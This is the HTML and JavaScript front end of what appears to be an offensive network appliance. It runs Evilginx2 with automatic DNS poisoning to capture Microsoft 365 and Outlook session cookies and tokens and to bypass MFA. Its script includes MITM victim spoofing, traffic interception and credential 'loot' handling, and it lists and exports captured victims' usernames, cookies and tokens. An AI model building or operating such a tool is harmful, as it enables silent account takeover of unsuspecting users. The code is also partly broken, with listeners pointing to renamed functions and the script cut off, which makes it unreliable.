<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NAC Bridge Monitor - Transparent Tap</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;color:#333}
.container{max-width:1400px;margin:0 auto}
.header{text-align:center;color:#fff;margin-bottom:30px}
.header h1{font-size:2.5em;margin-bottom:5px;text-shadow:2px 2px 4px rgba(0,0,0,.3)}
.header p{font-size:1em;opacity:.9}
.dashboard{background:#fff;border-radius:15px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
.info-banner{background:#e3f2fd;border-left:4px solid #2196f3;padding:15px;margin-bottom:20px;border-radius:5px}
.info-banner h3{color:#1976d2;margin-bottom:5px}
.info-banner p{color:#555;font-size:.9em}
.tab-nav{display:flex;gap:10px;margin-bottom:25px;border-bottom:2px solid #e0e0e0}
.tab-btn{padding:12px 24px;border:none;background:transparent;cursor:pointer;font-weight:600;color:#666;border-bottom:3px solid transparent;transition:all .3s}
.tab-btn:hover{color:#667eea}
.tab-btn.active{color:#667eea;border-bottom-color:#667eea}
.badge{display:inline-block;background:#dc3545;color:#fff;border-radius:12px;padding:2px 8px;font-size:.75em;margin-left:5px;min-width:20px;text-align:center}
.tab-content{display:none}
.tab-content.active{display:block}
.status-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:15px;border-bottom:2px solid #f0f0f0}
.status-badge{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;border-radius:20px;font-weight:600;font-size:.9em}
.status-badge.active{background:#d4edda;color:#155724}
.status-badge.inactive{background:#f8d7da;color:#721c24}
.status-indicator{width:12px;height:12px;border-radius:50%}
.status-indicator.active{background:#28a745;animation:pulse 2s infinite}
.status-indicator.inactive{background:#dc3545}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;margin-bottom:30px}
.card{background:#f8f9fa;border-radius:10px;padding:20px;border-left:4px solid #667eea}
.card-title{font-size:.9em;color:#666;margin-bottom:10px;text-transform:uppercase}
.card-value{font-size:1.8em;font-weight:700;color:#333}
.card-detail{font-size:.85em;color:#888;margin-top:5px}
.interface-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:15px;margin-top:15px}
.interface-card{background:#fff;border:2px solid #e0e0e0;border-radius:8px;padding:15px;transition:all .3s}
.interface-card:hover{border-color:#667eea;box-shadow:0 4px 12px rgba(102,126,234,0.2)}
.interface-header{display:flex;justify-content:space-between;margin-bottom:12px}
.interface-name{font-weight:700;font-size:1.1em;color:#667eea}
.interface-status{padding:4px 10px;border-radius:12px;font-size:.75em;font-weight:600}
.interface-status.up{background:#d4edda;color:#155724}
.interface-status.down{background:#f8d7da;color:#721c24}
.interface-detail{display:flex;justify-content:space-between;padding:6px 0;font-size:.9em;border-bottom:1px solid #f0f0f0}
.button-group{display:flex;gap:15px;flex-wrap:wrap;margin-top:20px}
.btn{flex:1;min-width:180px;padding:15px 30px;border:none;border-radius:8px;font-size:1em;font-weight:600;cursor:pointer;transition:all .3s;color:#fff}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn-start{background:#28a745}
.btn-start:hover:not(:disabled){background:#218838}
.btn-stop{background:#dc3545}
.btn-stop:hover:not(:disabled){background:#c82333}
.btn-refresh{background:#667eea}
.btn-refresh:hover:not(:disabled){background:#5568d3}
.btn-download{background:#17a2b8}
.btn-download:hover:not(:disabled){background:#138496}
.btn-danger{background:#dc3545}
.btn-danger:hover:not(:disabled){background:#c82333}
.info-box{background:#fff3cd;border-left:4px solid #ffc107;padding:15px;margin:15px 0;border-radius:5px}
.info-box h4{color:#856404;margin-bottom:8px}
.info-box p{color:#856404;font-size:.9em;margin:5px 0}
input[type="text"]{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:15px}
input[type="text"]:focus{outline:none;border-color:#667eea}
.rule-item{background:#f8f9fa;border-left:4px solid #28a745;padding:15px;margin:10px 0;border-radius:8px;display:flex;justify-content:space-between;align-items:center}
.rule-info{font-family:monospace;font-size:.9em}
.alert{padding:15px;border-radius:8px;margin-bottom:20px;display:none}
.alert.show{display:block}
.alert-success{background:#d4edda;color:#155724}
.alert-error{background:#f8d7da;color:#721c24}
.alert-info{background:#d1ecf1;color:#0c5460}
.capture-info{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border-radius:10px;padding:25px;margin-bottom:20px;display:none}
.capture-info.active{display:block}
.capture-detail{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.2)}
.logs-section{background:#1e1e1e;color:#0f0;border-radius:8px;padding:20px;margin-top:20px;font-family:monospace;font-size:.85em;max-height:300px;overflow-y:auto}
.loot-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin:20px 0}
.stat-card{background:#f8f9fa;border-radius:10px;padding:20px;text-align:center;border-left:4px solid #dc3545}
.stat-value{font-size:2.5em;font-weight:700;color:#333;margin-bottom:5px}
.stat-label{font-size:.9em;color:#666;text-transform:uppercase}
.loot-filters{display:flex;gap:10px;flex-wrap:wrap;margin:20px 0}
.filter-btn{padding:8px 16px;border:2px solid #e0e0e0;background:#fff;border-radius:20px;cursor:pointer;font-weight:600;color:#666;transition:all .3s}
.filter-btn:hover{border-color:#667eea;color:#667eea}
.filter-btn.active{background:#667eea;color:#fff;border-color:#667eea}
.loot-items{display:flex;flex-direction:column;gap:10px;margin:20px 0;max-height:500px;overflow-y:auto}
.loot-item{background:#fff;border:1px solid #e0e0e0;border-left:4px solid #dc3545;border-radius:8px;padding:15px;transition:all .3s}
.loot-item:hover{box-shadow:0 4px 12px rgba(0,0,0,.1);transform:translateX(5px)}
.loot-item.http{border-left-color:#28a745}
.loot-item.ftp{border-left-color:#17a2b8}
.loot-item.smtp{border-left-color:#ffc107}
.loot-item.ntlm{border-left-color:#dc3545}
.loot-item.imap{border-left-color:#6f42c1}
.loot-header{display:flex;justify-content:space-between;margin-bottom:10px}
.loot-protocol{font-weight:700;color:#667eea;font-size:1.1em}
.loot-timestamp{font-size:.85em;color:#999}
.loot-content{font-family:monospace;font-size:.9em;background:#f8f9fa;padding:10px;border-radius:5px;margin-top:10px}
.loot-field{padding:5px 0}
.loot-field strong{color:#333}
.empty-state{text-align:center;padding:60px 20px;color:#999}
.empty-state-icon{font-size:4em;margin-bottom:20px;opacity:.5}
</style>
<body>
<div class="container">
<div class="header">
<h1>Microsoft Token Capture</h1>
<p>Evilginx2 + Automatic DNS Poisoning</p>
</div>
<div class="dashboard">
<div id="alert" class="alert"></div>
<div class="status-header">
<h2>Evilginx2 - Microsoft Cookie Capture</h2>
<div id="evilginxStatus" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>

<div class="info-box">
<h4>Evilginx2 - OAuth Token & Cookie Harvester</h4>
<p>Captures Microsoft 365 authentication tokens and session cookies, including MFA bypass.</p>
<p><strong>Setup:</strong> DNS must point victim to this device, or use local DNS poisoning.</p>
</div>

<div id="evilginxNotInstalled" style="display:none;background:#ffe7e7;padding:20px;border-radius:8px;margin:15px 0;border-left:4px solid #e74c3c">
<h3 style="color:#e74c3c;margin-bottom:15px">WARNING: Evilginx2 Not Installed</h3>
<p style="margin-bottom:15px">Evilginx2 is required for OAuth token and cookie capture.</p>
<p style="font-size:.95em;color:#333;margin-top:10px">To install Evilginx2, run on the appliance:</p>
<pre style="background:#2d2d2d;color:#f8f8f2;padding:15px;border-radius:5px;margin:10px 0;font-size:.9em;overflow-x:auto">cd /opt/nac-tap
sudo ./install-evilginx.sh</pre>
<p style="font-size:.9em;color:#999;margin-top:10px">Installation takes 5-10 minutes. Refresh this page after completion.</p>
</div>

<div id="evilginxInfo" style="display:none;background:#e7f3ff;padding:20px;border-radius:8px;margin:15px 0">
<h3 style="color:#0066cc;margin-bottom:15px">Active - DNS Poisoning Mode</h3>
<p style="margin:8px 0"><strong>Phishlet:</strong> <code id="evilginxPhishlet" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>Domain:</strong> <code id="evilginxLure" style="background:#fff;padding:4px 8px;border-radius:4px;font-size:.85em">-</code></p>
<p style="margin:8px 0"><strong>Bridge IP:</strong> <code style="background:#fff;padding:4px 8px;border-radius:4px">10.200.66.1</code></p>
<div style="background:#d4edda;padding:12px;border-radius:5px;margin-top:15px;border-left:3px solid #28a745">
<p style="font-size:.9em;color:#155724;margin:0"><strong>Automatic DNS Poisoning Active!</strong></p>
<p style="font-size:.85em;color:#155724;margin-top:8px">Microsoft domains (<strong id="evilginxDomain2">-</strong>) automatically redirect to Evilginx</p>
<p style="font-size:.85em;color:#155724;margin-top:5px">User visits Microsoft normally → Automatic redirect → Session captured</p>
<p style="font-size:.85em;color:#155724;margin-top:5px;font-weight:600">No lure, no phishing email, completely transparent!</p>
</div>
</div>

<h3 style="margin:20px 0 15px 0">Microsoft Phishlet Selection</h3>
<div class="grid" style="margin-bottom:20px">
<div class="card" style="border-left-color:#0078d4">
<div class="card-title">Microsoft 365</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Outlook, SharePoint, Teams, OneDrive</div>
<div style="margin-top:10px;font-size:.85em;color:#0078d4">Phishlet: o365</div>
</div>
<div class="card" style="border-left-color:#0072c6">
<div class="card-title">Outlook.com</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Personal Outlook accounts</div>
<div style="margin-top:10px;font-size:.85em;color:#0072c6">Phishlet: outlook</div>
</div>
</div>


<div class="button-group">
<button id="btnStartO365" class="btn btn-start" onclick="startEvilginx('o365')">Start O365</button>
<button id="btnStartOutlook" class="btn btn-start" onclick="startEvilginx('outlook')">Start Outlook</button>
<button id="btnStopEvilginx" class="btn btn-stop" onclick="stopEvilginx()" disabled>Stop Evilginx</button>
</div>

<h3 style="margin:25px 0 15px 0">Captured Sessions</h3>
<div id="evilginxSessions" class="logs-section" style="max-height:500px">
<div style="color:#999;text-align:center;padding:40px">
<div style="font-size:3em;margin-bottom:15px">[ ]</div>
<p>No sessions captured yet</p>
<p style="margin-top:10px;font-size:.9em">Start Evilginx and send victims to lure URL</p>
</div>
</div>

<div class="button-group" style="margin-top:20px">
<button class="btn btn-refresh" onclick="fetchStatus()">Refresh Sessions</button>
<button class="btn btn-download" onclick="exportSessions()">Export Sessions (JSON)</button>
<button class="btn btn-danger" onclick="clearSessions()">Clear All Sessions</button>
</div>
</div>

</div>
</div>
<script>

// Error boundary - catch all errors
window.addEventListener('error', function(e) {
    console.error('Global error:', e.message, 'at', e.filename, 'line', e.lineno);
    alert('JavaScript Error: ' + e.message + ' at line ' + e.lineno);
});


console.log('Script starting...');

let startTime=null,currentFilter='all',allLoot=[];

function showAlert(message,type="info"){
    try{
        
const el=document.getElementById("alert");
        if(!el){console.error('Alert element not found');return}
        el.className="alert alert-"+type+" show";
        el.textContent=message;
        setTimeout(function(){el.classList.remove("show")},5000);
    }
catch(err){
        console.error('showAlert error:',err);
        alert(message);
    }
}

function formatBytes(bytes){if(bytes===0)return"0 B";
const k=1024,sizes=["B","KB","MB","GB"];
const i=Math.floor(Math.log(bytes)/Math.log(k));return parseFloat((bytes/Math.pow(k,i)).toFixed(2))+" "+sizes[i]}

function formatDuration(seconds){
const h=Math.floor(seconds/3600);
const m=Math.floor(seconds%3600/60);
const s=Math.floor(seconds%60);return h.toString().padStart(2,"0")+":"+m.toString().padStart(2,"0")+":"+s.toString().padStart(2,"0")}

// REMOVED: switchTab
function switchTab_removed(tab){
    try{
        
console.log('Switching to tab:', tab);
        document.querySelectorAll(".tab-content").forEach(el=>el.classList.remove("active"));
        document.querySelectorAll(".tab-btn").forEach(el=>el.classList.remove("active"));
        
const tabEl=document.getElementById(tab+"Tab");
        if(tabEl)tabEl.classList.add("active");
        if(window.event&&window.event.target)window.event.target.classList.add("active");
        if(tab==="loot")fetchLoot();
        if(tab==="mitm")fetchStatus();
    }
catch(err){
        console.error('switchTab error:',err);
        alert('Tab switch error: '+err.message);
    }
}

function updateStatus(data){
try{

const isActive=data.status==="active";

const badge=document.getElementById("statusBadge");
if(badge){
badge.className="status-badge "+(isActive?"active":"inactive");
badge.innerHTML='<span class="status-indicator '+(isActive?"active":"inactive")+'"></span><span>'+(isActive?"Active":"Inactive")+'</span>';
}

const captureInfo=document.getElementById("captureInfo");
if(captureInfo){
captureInfo.className="capture-info "+(isActive?"active":"");
}

const size=data.pcap_size||0;

const packets=data.packet_count||0;

const pcapSizeBtn=document.getElementById("btnPcapSize");
if(pcapSizeBtn){
pcapSizeBtn.textContent="PCAP Size: "+formatBytes(size);
pcapSizeBtn.disabled=!data.pcap_file;
}

if(data.mitm){

const mitmBadge=document.getElementById("mitmBadge");
if(mitmBadge){

const enabled=data.mitm.enabled;
mitmBadge.className="status-badge "+(enabled?"active":"inactive");
mitmBadge.innerHTML='<span class="status-indicator '+(enabled?"active":"inactive")+'"></span><span>'+(enabled?"Active":"Inactive")+'</span>';
}

const btnEnableMITM=document.getElementById("btnEnableMITM");
if(btnEnableMITM)btnEnableMITM.disabled=data.mitm.enabled;

const btnDisableMITM=document.getElementById("btnDisableMITM");
if(btnDisableMITM)btnDisableMITM.disabled=!data.mitm.enabled;

if(data.mitm.victim_mac){

const victimInfo=document.getElementById("victimInfo");
if(victimInfo)victimInfo.style.display="block";

const victimMac=document.getElementById("victimMac");
if(victimMac)victimMac.textContent=data.mitm.victim_mac;

const victimIP=document.getElementById("victimIP");
if(victimIP)victimIP.textContent=data.mitm.victim_ip||"Unknown";

const gatewayMac=document.getElementById("gatewayMac");
if(gatewayMac)gatewayMac.textContent=data.mitm.gateway_mac||"Unknown";
}else{

const victimInfo=document.getElementById("victimInfo");
if(victimInfo)victimInfo.style.display="none";
}

const rulesDiv=document.getElementById("activeRules");
if(rulesDiv){

if(data.mitm.active_rules&&data.mitm.active_rules.length>0){

var rulesHTML='';
for(
var i=0;i<data.mitm.active_rules.length;i++){

var rule=data.mitm.active_rules[i];
rulesHTML+='<div class="rule-item"><div class="rule-info"><strong>'+rule.protocol+'</strong> port '+rule.port+' to '+rule.target_ip+' ('+rule.destination+')</div></div>';
}
rulesDiv.innerHTML=rulesHTML;
}else{
rulesDiv.innerHTML='<p style="color:#999;text-align:center;padding:20px">No active intercept rules</p>';
}
}
}

if(data.evilginx){

const evilBadge=document.getElementById("evilginxBadge");

const evilBadge2=document.getElementById("evilginxStatus");

const running=data.evilginx.running;

const installed=data.evilginx.installed;

const sessCount=data.evilginx.sessions_count||0;
if(evilBadge)evilBadge.textContent=sessCount;
if(evilBadge2){
evilBadge2.className="status-badge "+(running?"active":"inactive");
evilBadge2.innerHTML='<span class="status-indicator '+(running?"active":"inactive")+'"></span><span>'+(running?"Running":"Inactive")+'</span>';
}

const statusCard=document.getElementById("evilginxStatusCard");

const installStatusEl=document.getElementById("evilginxInstallStatus");

const pathEl=document.getElementById("evilginxPath");

const btnInstall=document.getElementById("btnInstallEvilginx");
if(statusCard){
if(installed){
statusCard.style.borderLeftColor="#27ae60";
if(installStatusEl)installStatusEl.innerHTML='<span style="color:#27ae60">Installed</span>';
if(pathEl)pathEl.textContent=data.evilginx.install_path||'/opt/evilginx2/evilginx';
if(btnInstall)btnInstall.style.display="none";
}else{
statusCard.style.borderLeftColor="#e74c3c";
if(installStatusEl)installStatusEl.innerHTML='<span style="color:#e74c3c">Not Installed</span>';
if(pathEl)pathEl.textContent="Click below to install";
if(btnInstall)btnInstall.style.display="block";
}
}

const btnStartO365=document.getElementById("btnStartO365");

const btnStartOutlook=document.getElementById("btnStartOutlook");

const btnStopEvil=document.getElementById("btnStopEvilginx");

const evilNotInstalled=document.getElementById("evilginxNotInstalled");

const evilInfo=document.getElementById("evilginxInfo");
if(!installed){
if(btnStartO365)btnStartO365.disabled=true;
if(btnStartOutlook)btnStartOutlook.disabled=true;
if(btnStopEvil)btnStopEvil.disabled=true;
if(evilNotInstalled)evilNotInstalled.style.display="block";
if(evilInfo)evilInfo.style.display="none";
}else{
if(btnStartO365)btnStartO365.disabled=running;
if(btnStartOutlook)btnStartOutlook.disabled=running;
if(btnStopEvil)btnStopEvil.disabled=!running;
if(evilNotInstalled)evilNotInstalled.style.display="none";
if(evilInfo){
if(running&&data.evilginx.lure_url){
evilInfo.style.display="block";

const phishEl=document.getElementById("evilginxPhishlet");

const lureEl=document.getElementById("evilginxLure");
if(phishEl)phishEl.textContent=data.evilginx.phishlet||"Unknown";
if(lureEl)lureEl.textContent=data.evilginx.lure_url||"Unknown";
}else{
evilInfo.style.display="none";
}
}
}

const sessDiv=document.getElementById("evilginxSessions");
if(sessDiv){

if(data.evilginx.sessions&&data.evilginx.sessions.length>0){

var sessHTML='';
for(
var i=0;i<data.evilginx.sessions.length;i++){

var s=data.evilginx.sessions[i];
sessHTML+='<div style="background:#fff;margin:10px 0;padding:15px;border-radius:8px;border-left:4px solid #28a745">';
sessHTML+='<div style="display:flex;justify-content:space-between;margin-bottom:10px">';
sessHTML+='<strong style="color:#28a745">Session #'+(i+1)+'</strong>';
sessHTML+='<span style="color:#999;font-size:.85em">'+new Date(s.timestamp).toLocaleString()+'</span>';
sessHTML+='</div>';
sessHTML+='<div style="margin:8px 0;font-size:.95em"><strong>Username:</strong> <code style="background:#f0f0f0;padding:2px 6px;border-radius:3px">'+(s.username||'N/A')+'</code></div>';
sessHTML+='<div style="margin:8px 0;font-size:.95em"><strong>Phishlet:</strong> '+(s.phishlet||'N/A')+'</div>';
sessHTML+='<details style="margin-top:10px"><summary style="cursor:pointer;color:#0066cc">Show Cookies & Tokens</summary>';
sessHTML+='<pre style="background:#f8f8f8;padding:10px;margin-top:8px;border-radius:4px;font-size:.8em;overflow-x:auto;max-height:200px">'+escapeHtml(s.cookies||'No cookies')+'</pre>';
sessHTML+='<pre style="background:#f8f8f8;padding:10px;margin-top:8px;border-radius:4px;font-size:.8em;overflow-x:auto;max-height:200px">'+escapeHtml(s.tokens||'No tokens')+'</pre>';
sessHTML+='</details></div>';
}
sessDiv.innerHTML=sessHTML;
}else if(running){
sessDiv.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>Waiting for victims...</p><p style="margin-top:10px;font-size:.9em">Share lure URL with targets</p></div>';
}else{
sessDiv.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>No sessions captured yet</p><p style="margin-top:10px;font-size:.9em">Start Evilginx and send victims to lure URL</p></div>';
}
}
}
if(isActive){

const captureFile=document.getElementById("captureFile");
if(captureFile)captureFile.textContent=data.pcap_file?data.pcap_file.split("/").pop():"-";

const capturePid=document.getElementById("capturePid");
if(capturePid)capturePid.textContent=data.pid||"-";

const bridgeName=document.getElementById("bridgeName");
if(bridgeName)bridgeName.textContent=data.bridge||"br0";

const captureSize=document.getElementById("captureSize");
if(captureSize)captureSize.textContent=formatBytes(size);

const capturePackets=document.getElementById("capturePackets");
if(capturePackets)capturePackets.textContent=packets.toLocaleString()+" packets";

if(data.start_time){
if(!startTime)try{startTime=new Date(data.start_time)}
catch(e){startTime=new Date}

const elapsed=Math.floor((new Date()-startTime)/1000);

const captureDuration=document.getElementById("captureDuration");
if(captureDuration)captureDuration.textContent=formatDuration(elapsed);
}

const btnStart=document.getElementById("btnStart");
if(btnStart)btnStart.disabled=true;

const btnStop=document.getElementById("btnStop");
if(btnStop)btnStop.disabled=false;

const btnDelete=document.getElementById("btnDelete");
if(btnDelete)btnDelete.disabled=true;

const btnDownload=document.getElementById("btnDownload");
if(btnDownload)btnDownload.disabled=false;
}else{

const btnStart=document.getElementById("btnStart");
if(btnStart)btnStart.disabled=false;

const btnStop=document.getElementById("btnStop");
if(btnStop)btnStop.disabled=true;

const btnDelete=document.getElementById("btnDelete");
if(btnDelete)btnDelete.disabled=!data.pcap_file;

const btnDownload=document.getElementById("btnDownload");
if(btnDownload)btnDownload.disabled=!data.pcap_file;
startTime=null;

const captureSize=document.getElementById("captureSize");
if(captureSize)captureSize.textContent=data.pcap_size?formatBytes(data.pcap_size):"0 MB";

const capturePackets=document.getElementById("capturePackets");
if(capturePackets)capturePackets.textContent="0 packets";

const captureDuration=document.getElementById("captureDuration");
if(captureDuration)captureDuration.textContent="00:00:00";
}

if(data.interfaces){

const container=document.getElementById("interfaces");
if(container){

var intfHTML='';
for(
var i=0;i<data.interfaces.length;i++){

var intf=data.interfaces[i];
intfHTML+='<div class="interface-card">';
intfHTML+='<div class="interface-header">';
intfHTML+='<span class="interface-name">'+intf.name+'</span>';
intfHTML+='<span class="interface-status '+(intf.state==="UP"?"up":"down")+'">'+intf.state+'</span>';
intfHTML+='</div>';
intfHTML+='<div class="interface-detail"><span>MAC:</span><span style="font-family:monospace">'+(intf.mac||"N/A")+'</span></div>';
intfHTML+='<div class="interface-detail"><span>Role:</span><span>'+(intf.role||"N/A")+'</span></div>';
intfHTML+='</div>';
}
container.innerHTML=intfHTML;
}
}

if(data.logs&&data.logs.length>0){

const logEl=document.getElementById("logs");
if(logEl){

var logHTML='';
for(
var i=0;i<data.logs.length;i++){
logHTML+='<div style="padding:2px 0">'+data.logs[i]+'</div>';
}
logEl.innerHTML=logHTML;
logEl.scrollTop=logEl.scrollHeight;
}
}
}
catch(err){
console.error("Error updating status:",err);
}
}
// REMOVED
async function analyzeNow_removed(){
const btnAnalyze=document.getElementById("btnAnalyze");if(btnAnalyze)btnAnalyze.disabled=true;showAlert("Running PCredz analysis... This may take a few minutes.","info");try{
const res=await fetch("/api/analyze",{method:"POST"});
const data=await res.json();
if(data.success){showAlert("Analysis complete! Check output below.","success");fetchLoot()}else{showAlert("Analysis failed: "+(data.error||"Unknown error"),"error")}}
catch(err){showAlert("Error: "+err.message,"error")}finally{if(btnAnalyze)btnAnalyze.disabled=false}}
// REMOVED
async function deletePCAP_removed(){if(confirm("Delete current PCAP file? This cannot be undone!")){try{
const res=await fetch("/api/delete_pcap",{method:"POST"});
const data=await res.json();
if(data.success){showAlert("PCAP deleted","success");fetchStatus();fetchLoot()}else{showAlert("Failed to delete PCAP: "+(data.error||"Unknown error"),"error")}}
catch(err){showAlert("Error: "+err.message,"error")}}}
async function fetchStatus(){try{
const res=await fetch("/api/status");
const data=await res.json();updateStatus(data)}
catch(err){console.error("Failed to fetch status:",err);setTimeout(fetchStatus,5000)}}
// REMOVED
async function fetchLoot_removed(){try{
const res=await fetch("/api/loot");
const data=await res.json();
const outputEl=document.getElementById("lootOutput");if(outputEl){
if(data.has_output&&data.raw_output){outputEl.innerHTML='<pre style="margin:0;color:#0f0;font-family:monospace;font-size:.9em">'+escapeHtml(data.raw_output)+'</pre>';
const badge=document.getElementById("lootBadge");if(badge)badge.textContent="OK"}else{outputEl.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>No PCredz output yet</p><p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p></div>';
const badge=document.getElementById("lootBadge");if(badge)badge.textContent="0"}}}
catch(err){console.error("Failed to fetch loot:",err)}}

function escapeHtml(text){
const div=document.createElement('div');div.textContent=text;return div.innerHTML}
// REMOVED
async function exportLoot_removed(){try{
const res=await fetch("/api/loot");
const data=await res.json();
if(data.has_output){window.location.href="/api/loot/export"}else{showAlert("No output to export yet","info")}}
catch(err){showAlert("Error: "+err.message,"error")}}
// REMOVED
async function clearLoot_removed(){if(confirm("Clear all captured credentials?")){try{
const res=await fetch("/api/loot/clear",{method:"POST"});
const data=await res.json();
if(data.success){showAlert("Loot cleared","success");fetchLoot()}else{showAlert("Failed to clear loot","error")}}
catch(err){showAlert("Error: "+err.message,"error")}}}
// REMOVED
async function startCapture_removed(){document.getElementById("btnStart").disabled=true;showAlert("Starting packet capture...","info");try{
const res=await fetch("/api/start",{method:"POST"});
const data=await res.json();
if(data.success){showAlert("Capture started!","success");setTimeout(fetchStatus,2000);setTimeout(fetchLoot,3000)}else{showAlert("Failed to start. Check logs.","error");document.getElementById("btnStart").disabled=false}}
catch(err){showAlert("Error: "+err.message,"error");document.getElementById("btnStart").disabled=false}}
// REMOVED
async function stopCapture_removed(){if(confirm("Stop capture? Bridge will remain active.")){document.getElementById("btnStop").disabled=true;showAlert("Stopping capture...","info");try{
const res=await fetch("/api/stop",{method:"POST"});
const data=await res.json();
if(data.success){showAlert("Capture stopped!","success")}else{showAlert("Failed to stop","error")}setTimeout(fetchStatus,3000);setTimeout(fetchLoot,4000)}
catch(err){showAlert("Error: "+err.message,"error")}}}
// REMOVED
async function downloadPCAP_removed(){try{
const res=await fetch("/api/status");
const data=await res.json();
if(data.pcap_file){window.location.href="/api/download?file="+encodeURIComponent(data.pcap_file)}else{showAlert("No file","error")}}
catch(err){showAlert("Error: "+err.message,"error")}}
// REMOVED
async function enableMITM_removed(){
const remoteIP=document.getElementById("remoteIP").value.trim();
const msg=remoteIP?"Enable MITM and route to "+remoteIP+"?\n\nThis will:\n1. Learn victim MAC/IP\n2. Spoof victim identity\n3. Route intercepted traffic to remote VM":"Enable MITM (local mode)?\n\nThis will:\n1. Learn victim MAC/IP\n2. Spoof victim identity\n3. Intercept traffic locally";if(!confirm(msg))return;
const btnEnableMITM=document.getElementById("btnEnableMITM");if(btnEnableMITM)btnEnableMITM.disabled=true;showAlert("Enabling MITM... Learning victim (30s)","info");try{
const body=remoteIP?JSON.stringify({remote_ip:remoteIP}):'{}';
const res=await fetch("/api/mitm/enable",{method:"POST",headers:{"Content-Type":"application/json"},body:body});
const data=await res.json();
if(data.success){showAlert("MITM enabled! Victim identified.","success");setTimeout(fetchStatus,1000)}else{showAlert("MITM failed: "+(data.error||"Unknown error"),"error");if(btnEnableMITM)btnEnableMITM.disabled=false}}
catch(err){showAlert("Error: "+err.message,"error");if(btnEnableMITM)btnEnableMITM.disabled=false}}
// REMOVED
async function disableMITM_removed(){if(!confirm("Disable MITM and cleanup all rules?"))return;showAlert("Disabling MITM...","info");try{
const res=await fetch("/api/mitm/disable",{method:"POST"});
const data=await res.json();
if(data.success){showAlert("MITM disabled","success");setTimeout(fetchStatus,1000)}}
catch(err){showAlert("Error: "+err.message,"error")}}
async function interceptCategory(category){
const destination=document.getElementById("remoteIP").value.trim()?'remote':'local';
const target=destination==='remote'?document.getElementById("remoteIP").value:'bridge IP';if(!confirm("Intercept "+category+" traffic?\n\nDestination: "+target))return;showAlert("Adding "+category+" intercept rules...","info");try{
const res=await fetch("/api/mitm/intercept",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({category:category,destination:destination})});
const data=await res.json();
if(data.success){showAlert(category+" interception enabled ("+data.rules_added+" rules)","success");setTimeout(fetchStatus,1000)}else{showAlert("Failed to add rules","error")}}
catch(err){showAlert("Error: "+err.message,"error")}}
// REMOVED
async function clearRules_removed(){if(!confirm("Remove all intercept rules?"))return;try{
const res=await fetch("/api/mitm/clear_rules",{method:"POST"});if(res.ok){showAlert("Rules cleared","success");setTimeout(fetchStatus,1000)}}
catch(err){showAlert("Error: "+err.message,"error")}}

async function startEvilginx(phishlet){
const domain=document.getElementById("evilginxDomain").value.trim();
const msg=domain?"Start Evilginx with "+phishlet+" phishlet using domain "+domain+"?":"Start Evilginx with "+phishlet+" phishlet using default domain?";if(!confirm(msg))return;document.getElementById("btnStartO365").disabled=true;document.getElementById("btnStartOutlook").disabled=true;showAlert("Starting Evilginx ("+phishlet+")...","info");try{
const body={phishlet:phishlet};
if(domain)body.domain=domain;
const res=await fetch("/api/evilginx/start",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
const data=await res.json();
if(data.success){showAlert("Evilginx started! Lure: "+data.lure_url,"success");setTimeout(fetchStatus,1000)}else{showAlert("Failed to start: "+(data.error||"Unknown error"),"error");document.getElementById("btnStartO365").disabled=false;document.getElementById("btnStartOutlook").disabled=false}}
catch(err){showAlert("Error: "+err.message,"error");document.getElementById("btnStartO365").disabled=false;document.getElementById("btnStartOutlook").disabled=false}}

async function stopEvilginx(){if(!confirm("Stop Evilginx? Captured sessions will be saved."))return;showAlert("Stopping Evilginx...","info");try{
const res=await fetch("/api/evilginx/stop",{method:"POST"});
const data=await res.json();
if(data.success){showAlert("Evilginx stopped","success");setTimeout(fetchStatus,1000)}}
catch(err){showAlert("Error: "+err.message,"error")}}

async function clearSessions(){if(!confirm("Clear all captured sessions?"))return;try{
const res=await fetch("/api/evilginx/clear_sessions",{method:"POST"});if(res.ok){showAlert("Sessions cleared","success");setTimeout(fetchStatus,1000)}}
catch(err){showAlert("Error: "+err.message,"error")}}


function exportSessions(){
window.location.href="/api/evilginx/sessions";
}

// Wait for DOM to be fully loaded before attaching event listeners

console.log('Setting up DOMContentLoaded handler');
document.addEventListener('DOMContentLoaded',function(){
try{

console.log('DOM Content Loaded - attaching event listeners');

const btnStart=document.getElementById("btnStart");

const btnStop=document.getElementById("btnStop");

const btnDownload=document.getElementById("btnDownload");

const btnDelete=document.getElementById("btnDelete");


console.log('Buttons found:', {start:!!btnStart, stop:!!btnStop, download:!!btnDownload, delete:!!btnDelete});

if(btnStart){
btnStart.addEventListener("click",startCapture);

console.log('Start button listener attached');
}
if(btnStop){
btnStop.addEventListener("click",stopCapture);

console.log('Stop button listener attached');
}
if(btnDownload){
btnDownload.addEventListener("click",downloadPCAP);

console.log('Download button listener attached');
}
if(btnDelete){
btnDelete.addEventListener("click",deletePCAP);

console.log('Delete button listener attached');
}


console.log('Fetching initial status...');
